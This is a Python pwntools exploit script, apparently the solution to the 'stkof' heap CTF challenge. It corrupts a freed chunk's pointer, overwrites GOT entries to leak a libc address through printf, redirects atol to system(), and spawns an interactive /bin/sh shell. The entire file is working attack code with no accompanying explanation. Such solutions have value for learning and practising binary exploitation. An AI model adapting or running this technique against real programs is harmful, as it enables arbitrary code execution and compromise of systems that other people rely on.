#!/usr/bin/python
from pwn import *

puts_got = 0x602020
printf_got = 0x602040
printf_plt = 0x4007a6
strlen_got = 0x602030
stdin_next = 0x6020e0
atol_got = 0x602080

def ALLOC(size):
    p.sendline("1")
    p.sendline(str(size))
    print p.recvline()[:-1]
    print p.recvline()[:-1]

def UPDATE(index, data):
    p.sendline("2")
    p.sendline(str(index))
    p.sendline(str(len(data)))
    p.send(data)
    print p.recvline()[:-1]

def DELETE(index):
    p.sendline("3")
    p.sendline(str(index))
    print p.recvline()[:-1]

def PRINT(index):
    p.sendline("4")
    p.sendline(str(index))
    data = p.recvuntil("OK")
    print data
    return data

def leak():
    ALLOC(0x60)
    ALLOC(0x60)
    ALLOC(0x60)
    ALLOC(0x60)
    ALLOC(0x60)

    DELETE(2)
    DELETE(4)

    #
    payload = p64(0)*13 + p64(0x71) + p64(stdin_next-0x10-3)
    UPDATE(3, payload)

    ALLOC(0x60)
    ALLOC(0x60)
    #
    payload = 'a'*3 + p64(0)*13 + p64(strlen_got) + p64(0) + p64(puts_got) + p64(0) + p64(atol_got)
    UPDATE(7, payload)

    UPDATE(1, p64(printf_plt))

    addr = PRINT(3)[:6]
    puts_plt = u64(addr+"\x00"*2)
    libc_base = puts_plt - 0x6f690
    print 'libc base', hex(libc_base)
    return libc_base

if __name__ == "__main__":
    p = process("./stkof")

    libc_base = leak()
    system_addr = libc_base + 0x45390

    UPDATE(5, p64(system_addr))

    PRINT("/bin/sh")

    p.interactive()
    p.close()
